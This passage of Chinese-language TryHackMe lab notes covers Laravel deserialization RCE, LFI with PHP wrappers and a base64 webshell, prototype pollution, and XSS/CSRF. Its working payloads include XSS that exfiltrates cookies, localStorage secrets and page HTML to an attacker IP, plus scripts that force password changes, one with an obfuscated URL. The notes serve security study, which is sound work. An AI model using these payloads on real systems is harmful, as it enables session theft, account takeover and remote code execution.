<span class="line"><span style="color: #61AFEF">php</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">phpggc</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-l</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Laravel</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 生成 payload</span></span>
<span class="line"><span style="color: #61AFEF">php</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">phpggc</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Laravel/RCE3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">system</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">whoami</span></span></code></pre></div></div></figure>

<p>通过 Payload + APP_KEY 生成可利用的 payload，这里 THM 有一个网页帮我们实现这一点</p>
<p><a target="_blank" rel="noopener" href="http://10.10.82.141:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY=&payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0=">http://10.10.82.141:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY%3D&amp;payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0%3D</a></p>
<p>执行 payload</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># whoami</span></span>
<span class="line"><span style="color: #61AFEF">curl</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.10</span><span style="color: #98C379">.82.141:8089</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-X</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">POST</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-H</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;X-XSRF-TOKEN: eyJpdiI6Im01dXZ0QXhrVm5iUHFOZWxCSnFINHc9PSIsInZhbHVlIjoiSWxhVDZZXC9cL0dyTTNLQVVsNVN6cGpFRXdYeDVqN1RcL3d0Umhtcnd2TzlVM1I5SnZ3OVdyeVFjU3hwbFwvS2dvaUF5ZlpTcW04eThxdXdQVWE5K08xSWU4Q1FWMG5GVjhlKzJkdEUwUnhXYXNuamFaWDI4bXFIZ1FaOHRWRGtVaE1EVGRxeE8xcGp0MWc0ZjNhMU5cL1BWdlQ0ZjdwdmRJWHRFYXR1YUUyNUNHTG0rRlNqWkxDSU9vSlI1MGhUNmtFQytpdnVmTnRlTVFNKzZhRDQ0amhBRXNGaUZMcmplMWdQajhINDBsY05sNis2d28rdktGNU04bklIdEUrVGczR3hseXQ0eEF4RjJoSU1oYXZVU3ZhSk1CUjlEKzZzaEdJRHk5RXlscjhOSUh5bjl0MitUeEx2Y281VTZUY29Ea0kyRiIsIm1hYyI6ImE1OGY2MjBhZThmYjdhMTgyMzA1M2IwNGExZmJkZTMzOTA2ZDBhMDI5N2Y3OWQzNDYwNzJjZTgyNjIzNmFhMTMifQ==&#39;</span><span style="color: #ABB2BF">| </span><span style="color: #61AFEF">head</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-n</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># uname -r</span></span>
<span class="line"><span style="color: #61AFEF">curl</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.10</span><span style="color: #98C379">.82.141:8089</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-X</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">POST</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-H</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;X-XSRF-TOKEN: eyJpdiI6Ikx4REd5Um5jY0xqa0JYWmlNVnlSRGc9PSIsInZhbHVlIjoiSHRONWhPXC9VK29rY2YrcjFBY2JkblRVM3ZHM1FHcWN4MUZpY0NITmh0cTdrZEE2bytFajdnUm0xVThPYTd4VXRZZ2NNd29jRVhRNmpoZUsxNEdrV05FVmU2eUpkUHJBdDZrVlNITXF3UVptMlpWaVBCWEoyeEV4bjMxMjQzMWdMemk2V1U1ZU5DSFRBdFwvdHBSb0lLdDlUS1dIXC9qK0ZnUUc2R0I1c3ZPbHFyYWMxR0d3VDBPSGlGTXYydmVDOXFzTkxQS0tcL0FBOGljWks0cXVHcWpETHYrS3FDSXp3M1l1Vm9wWDA3VVU0a05sM2VTNm5NbW1WcDdGeDBzR29WN0g5clZvUThRNFd6T0F2ek1ZN09ac1wvamdGcEV3RitEK3lnYTA4c2FHazZHdlB0SVhBb2prXC9NV0FNSWNYV2NWU3MiLCJtYWMiOiJjOTgyZjgzYmQwZWZkZmJkY2JiYjkyZWJhZDNjN2IwODk2NGZjNmVhODMzYmM2NzdjZTViN2UwNDI1ZWIxMzMzIn0=&#39;</span><span style="color: #ABB2BF">| </span><span style="color: #61AFEF">head</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-n</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2</span></span></code></pre></div></div></figure>

<h3 id="Java-反序列化利用工具"><a href="#Java-反序列化利用工具" class="headerlink" title="Java 反序列化利用工具"></a>Java 反序列化利用工具</h3><p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a></p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>我觉得他说的有意义的一点就是可以用 SSRF 去 DDOS，这也是一种反射式攻击了，其他的倒没说什么。</p>
<h2 id="补救措施"><a href="#补救措施" class="headerlink" title="补救措施"></a>补救措施</h2><p>输入强校验</p>
<p>白名单</p>
<p>网络隔离</p>
<p>实行强访问控制</p>
<p>全面日志监控</p>
<h1 id="File-Inclusion-Path-Traversal"><a href="#File-Inclusion-Path-Traversal" class="headerlink" title="File Inclusion, Path Traversal"></a>File Inclusion, Path Traversal</h1><p>LFI 可以用</p>
<h2 id="PHP-Wrappers"><a href="#PHP-Wrappers" class="headerlink" title="PHP Wrappers"></a>PHP Wrappers</h2><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">php://filter/convert.base64-encode/resource=/etc/passwd</span></span></code></pre></div></div></figure>

<h3 id="Data-Wrapper"><a href="#Data-Wrapper" class="headerlink" title="Data Wrapper"></a>Data Wrapper</h3><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">data:text/plain,&lt;?php%20phpinfo();%20?&gt;</span></span></code></pre></div></div></figure>

<h2 id="LFI2CE-Session-Files"><a href="#LFI2CE-Session-Files" class="headerlink" title="LFI2CE - Session Files"></a>LFI2CE - Session Files</h2><p>session 投毒，想办法往 session 里面写东西，然后用 LFI 去访问那个文件</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydscyddKTtlY2hvICdTaGVsbCBkb25lICEnOyA/Pj4=</span></span></code></pre></div></div></figure>

<h1 id="Prototype-Pollution"><a href="#Prototype-Pollution" class="headerlink" title="Prototype Pollution"></a>Prototype Pollution</h1><p>这个房间讲了一下原型链污染，主要还是这种 OOP 语言有继承的特性，而 JS 子类的方法全是在一个链上的，他的子类有他链上的所有方法。</p>
<p>用 <code>__proto__</code> 可以访问到一个对象的原型。</p>
<figure class="shiki js"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">{</span><span style="color: #98C379">&quot;__proto__&quot;</span><span style="color: #ABB2BF">: {</span><span style="color: #98C379">&quot;toLocaleString&quot;</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&quot;Just crash the server&quot;</span><span style="color: #ABB2BF">}}</span></span></code></pre></div></div></figure>

<h1 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h1><p>这个房间用了原型链调用，SSRF，LFI 加日志污染，日志污染没有实操过，我自己的思路是对的，但是卡在那里了，看了一下 writeup 秒解</p>
<p><a target="_blank" rel="noopener" href="https://medium.com/@z0diac/include-ctf-tryhackme-writeup-c36bded6d2f4">https://medium.com/@z0diac/include-ctf-tryhackme-writeup-c36bded6d2f4</a></p>
<p>DOM XSS</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&lt;img src=&quot;nonexistent.jpg&quot; onerror=&quot;fetch(&#39;http://10.14.106.192/?secret=&#39; + localStorage.getItem(&#39;secret&#39;));&quot;&gt;</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">&lt;img src=&quot;x&quot; onerror=&quot;this.onerror=null; fetch(&#39;http://10.14.106.192/?data=&#39;+encodeURIComponent(document.documentElement.outerHTML));&quot;&gt;</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">&lt;img src=&quot;nonexistent.jpg&quot; onerror=&quot;this.onerror=null; setTimeout(() =&gt; { fetch(&#39;http://10.14.106.192/?secret=&#39; + localStorage.getItem(&#39;secret&#39;)); }, 6000);&quot;&gt;</span></span></code></pre></div></div></figure>

<h1 id="CORS-SOP"><a href="#CORS-SOP" class="headerlink" title="CORS &amp; SOP"></a>CORS &amp; SOP</h1><p>这个房间就讲 CORS 和同源策略了</p>
<p>SOP 以下几点要注意</p>
<ul>
<li>即便是同一个域名，不同端口，也是会被影响的，就不用说 HTTP 和 HTTPS 了。</li>
<li><del>SOP 不仅仅只应用于脚本上，他应用在网页上所有的东西，也就是有 URL 引入，要调用的东西（有歧义，待完善）</del></li>
<li>SOP 并不是阻止了所有的跨站通信，CORS 就是用来解决这点的</li>
</ul>
<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>服务器不会阻拦请求，而是浏览器通过服务器发来的 CORS header 处理这条请求，实际上是浏览器这边作的处理。</p>
<h3 id="CORS-中不同的-HTTP-头"><a href="#CORS-中不同的-HTTP-头" class="headerlink" title="CORS 中不同的 HTTP 头"></a>CORS 中不同的 HTTP 头</h3><ol>
<li><strong>Access-Control-Allow-Origin</strong>: This header specifies which domains are allowed to access the resources. For example, <code>Access-Control-Allow-Origin: example.com</code> allows only requests from <code>example.com</code>.</li>
<li><strong>Access-Control-Allow-Methods</strong>: Specifies the HTTP methods (GET, POST, etc.) that can be used during the request.</li>
<li><strong>Access-Control-Allow-Headers</strong>: Indicates which HTTP headers can be used during the actual request.</li>
<li><strong>Access-Control-Max-Age</strong>: Defines how long the results of a preflight request can be cached.</li>
<li><strong>Access-Control-Allow-Credentials</strong>: This header instructs the browser whether to expose the response to the frontend JavaScript code when credentials like cookies, HTTP authentication, or client-side SSL certificates are sent with the request. If Access-Control-Allow-Credentials is set to true, it allows the browser to access the response from the server when credentials are included in the request. It’s important to note that when this header is used, Access-Control-Allow-Origin cannot be set to * and must specify an explicit domain to maintain security.</li>
</ol>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"># 偷 Cookie XSS</span></span>
<span class="line"><span style="color: #abb2bf">&lt;img src=&quot;x&quot; onerror=&quot;this.onerror=null; fetch(&#39;http://10.14.106.192/?data1=&#39;+encodeURIComponent(document.cookie));&quot;&gt;</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf"># 偷页面内容 XSS</span></span>
<span class="line"><span style="color: #abb2bf">&lt;img src=&quot;x&quot; onerror=&quot;this.onerror=null; fetch(&#39;http://10.14.106.192/?data1=&#39;+encodeURIComponent(document.documentElement.outerHTML));&quot;&gt;</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">&lt;img src=&quot;x&quot; onerror=&quot;this.onerror=null; window.location.href=&#39;http://10.14.106.192:81/index.html&#39;;&quot;&gt;</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">&lt;script&gt;</span></span>
<span class="line"><span style="color: #abb2bf">  window.location.href=&#39;http://10.14.106.192:81/&#39;;</span></span>
<span class="line"><span style="color: #abb2bf">&lt;/script&gt;</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">&lt;iframe style=&quot;display:none;&quot; src=&quot;http://10.14.106.192:81/&quot;&gt;&lt;/iframe&gt;</span></span></code></pre></div></div></figure>

<p>XSS + CSRF</p>
<figure class="shiki js"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">  // 1. 定义你要发送的 POST 请求的目标 URL</span></span>
<span class="line"><span style="color: #ABB2BF">  const targetUrl = &#39;http://target.com/change_password.php&#39;; // 替换为实际目标 URL</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">  // 2. 定义 POST 请求要发送的数据（JSON 格式）</span></span>
<span class="line"><span style="color: #ABB2BF">  const postData = </span><span style="color: #C678DD">{</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">username</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;attacker_controlled_name&#39;</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">email</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;attacker@example.com&#39;</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic">// ... 其他你想修改的字段</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">}</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">  // 3. 使用 fetch API 发送 POST 请求</span></span>
<span class="line"><span style="color: #ABB2BF">  fetch(targetUrl, </span><span style="color: #C678DD">{</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">method</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;POST&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #7F848E; font-style: italic">// 指定为 POST 请求</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">headers</span><span style="color: #ABB2BF">: {</span></span>
<span class="line"><span style="color: #ABB2BF">      </span><span style="color: #98C379">&#39;Content-Type&#39;</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;application/json&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #7F848E; font-style: italic">// 设置 Content-Type，通常是 JSON</span></span>
<span class="line"><span style="color: #ABB2BF">      </span><span style="color: #7F848E; font-style: italic">// 可以添加其他需要的头部，例如 Authorization header 如果需要</span></span>
<span class="line"><span style="color: #ABB2BF">    },</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">body</span><span style="color: #ABB2BF">: </span><span style="color: #E5C07B">JSON</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">stringify</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">postData</span><span style="color: #ABB2BF">), </span><span style="color: #7F848E; font-style: italic">// 将 JavaScript 对象转换为 JSON 字符串作为请求体</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">credentials</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;include&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">// **关键：确保浏览器自动携带目标域的 Cookie**</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">}</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">  .then(response =&gt; </span><span style="color: #C678DD">{</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic">// 4. 请求成功后，如果服务器响应 CORS 头允许，可以读取响应</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic">//    这里的 XSS 使得你处于同源上下文，所以通常可以读取响应</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">ok</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">      return response.json(); </span><span style="color: #7F848E; font-style: italic">// 如果响应是 JSON</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">throw</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Error</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;Network response was not ok.&#39;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">}</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">  .then(data =&gt; </span><span style="color: #C678DD">{</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">console</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">log</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;Profile update response:&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">data</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic">// 5. 如果你想将响应数据回传到你的服务器，可以再次发起一个请求</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">fetch</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;http://10.14.106.192/log_data.php&#39;</span><span style="color: #ABB2BF">, {</span></span>
<span class="line"><span style="color: #ABB2BF">      </span><span style="color: #E06C75">method</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;POST&#39;</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">      </span><span style="color: #E06C75">headers</span><span style="color: #ABB2BF">: { </span><span style="color: #98C379">&#39;Content-Type&#39;</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;application/json&#39;</span><span style="color: #ABB2BF"> },</span></span>
<span class="line"><span style="color: #ABB2BF">      </span><span style="color: #E06C75">body</span><span style="color: #ABB2BF">: </span><span style="color: #E5C07B">JSON</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">stringify</span><span style="color: #ABB2BF">({</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">stolen_response</span><span style="color: #ABB2BF">: </span><span style="color: #E06C75">data</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">victim_url</span><span style="color: #ABB2BF">: </span><span style="color: #E5C07B">window</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">location</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">href</span></span>
<span class="line"><span style="color: #ABB2BF">      })</span></span>
<span class="line"><span style="color: #ABB2BF">    });</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">}</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">  .catch(error =&gt; </span><span style="color: #C678DD">{</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">console</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">error</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;There was a problem with the fetch operation:&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">error</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">}</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>

<figure class="shiki html"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">const</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">targetUrl</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;http://worldwap.thm:8081/change_password.php&#39;</span><span style="color: #ABB2BF">; </span></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">const</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">postBody</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;new_password=hacked123&#39;</span><span style="color: #ABB2BF">; </span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">  </span><span style="color: #61AFEF">fetch</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">targetUrl</span><span style="color: #ABB2BF">, {</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">method</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;POST&#39;</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">headers</span><span style="color: #ABB2BF">: {</span></span>
<span class="line"><span style="color: #ABB2BF">      </span><span style="color: #98C379">&#39;Content-Type&#39;</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;application/x-www-form-urlencoded&#39;</span><span style="color: #ABB2BF"> </span></span>
<span class="line"><span style="color: #ABB2BF">    },</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">body</span><span style="color: #ABB2BF">: </span><span style="color: #E06C75">postBody</span><span style="color: #ABB2BF"> </span></span>
<span class="line"><span style="color: #ABB2BF">  }).</span><span style="color: #61AFEF">then</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=&gt;</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">ok</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">      </span><span style="color: #E5C07B">console</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">log</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;Password change request sent successfully. Status:&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">status</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">      </span><span style="color: #E5C07B">console</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">error</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;Password change request failed. Status:&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">status</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"><span style="color: #ABB2BF">  }).</span><span style="color: #61AFEF">catch</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75; font-style: italic">error</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=&gt;</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">console</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">error</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;An error occurred during the password change request:&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">error</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">  });</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>

<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&lt;script&gt;</span></span>
<span class="line"><span style="color: #abb2bf">  var targetUrlEncoded = &#39;aHR0cDovL3dvcmxkd2FwLnRo bT o4MDgxL2NoYW5nZV9wYXNzd29yZC5waHA=&#39;;</span></span>
<span class="line"><span style="color: #abb2bf">  var targetUrl = atob(targetUrlEncoded.replace(/\s/g, &#39;&#39;));</span></span>
<span class="line"><span style="color: #abb2bf">  var postBody = &#39;new_password=hacked123&#39;;</span></span>
<span class="line"><span style="color: #abb2bf">  var xhr = new XMLHttpRequest();</span></span>
<span class="line"><span style="color: #abb2bf">  xhr.open(&#39;POST&#39;, targetUrl, true);</span></span>
<span class="line"><span style="color: #abb2bf">  xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;);</span></span>
<span class="line"><span style="color: #abb2bf">  xhr.withCredentials = true;</span></span>
<span class="line"><span style="color: #abb2bf">  xhr.onload = function() {</span></span>
<span class="line"><span style="color: #abb2bf">    if (xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) {</span></span>
<span class="line"><span style="color: #abb2bf">      console.log(&#39;Password change request sent. Status:&#39;, xhr.status);</span></span>
